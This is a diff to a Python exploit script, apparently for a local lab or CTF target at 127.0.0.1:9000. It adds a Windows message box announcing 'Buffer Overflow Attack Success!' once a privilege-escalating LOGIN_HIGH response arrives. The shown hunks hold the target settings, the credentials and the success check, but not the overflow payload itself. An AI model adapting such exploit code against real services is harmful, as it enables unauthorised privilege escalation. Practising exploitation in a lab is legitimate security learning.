@@ -1,6 +1,8 @@
 import socket
 import json
 import struct
+import ctypes
+from ctypes import wintypes
 
 TARGET_IP = "127.0.0.1"
 TARGET_PORT = 9000
@@ -9,6 +11,18 @@ LOW_USERNAME = "user"
 LOW_PASSWORD = "123456" # 如果 server config 没设密码，这里可能需要置空或根据环境调整
 ADMIN_USERNAME = "admin"
 BANNER = b"PWNREMOTE/1.0 READY"
+
+
+# --- 本地弹窗函数（关键新增）---
+def show_local_success_dialog():
+    """在本机弹出 Windows 消息框"""
+    MessageBoxW = ctypes.windll.user32.MessageBoxW
+    MessageBoxW.argtypes = [wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.UINT]
+    MessageBoxW.restype = ctypes.c_int
+
+    # 弹窗：标题 + 内容
+    MessageBoxW(None, "Buffer Overflow Attack Success!", "PWNED", 0x40)  # 0x40 = MB_ICONINFORMATION
+    
 
 # --- 辅助函数 (保持不变) ---
 def build_cmd(cmd, args):
@@ -101,6 +115,7 @@ def debug_exploit():
         # 第三步：验证结果
         if resp_high:
             print("[*] LOGIN_HIGH response received.")
+            show_local_success_dialog()
         else:
             print("[-] No response from server.")
 
